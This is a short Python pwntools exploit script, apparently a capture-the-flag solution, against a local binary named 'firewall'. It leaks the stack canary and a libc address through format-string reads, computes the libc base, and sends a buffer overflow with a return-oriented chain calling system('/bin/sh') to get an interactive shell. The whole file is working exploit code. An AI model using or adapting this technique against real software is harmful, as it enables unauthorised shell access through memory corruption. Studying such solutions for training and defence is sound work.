from pwn import *

pop_rdi_offset = 0x0000000000026796
libc_start_main_offset = 0x0000000000026c20
system_offset = 0x0000000000048e50
str_bin_sh_offset = 0x000000000018a156

p = process('./firewall')

p.recv()
payload = b'%41$llx'
p.sendline(payload)

p.recvuntil('[x]~> ')
canary = int(p.recvline().strip(), 16)
payload = b'%43$llx'
p.sendline(payload)

p.recvuntil('[x]~> ')
libc_start_main = int(p.recvline().strip(), 16) - 234
print('libc_start_main: ' + hex(libc_start_main))
print('canary: ' + hex(canary))

p.sendline(b'connect')

p.sendline(b'send')
p.recvuntil('[*]~> ')

base = libc_start_main - libc_start_main_offset
payload = b'G' * 264 + p64(canary) + b'G' * 8 + p64(pop_rdi_offset + base) + p64(base + str_bin_sh_offset) + p64(system_offset + base)

p.sendline(payload)

p.interactive()

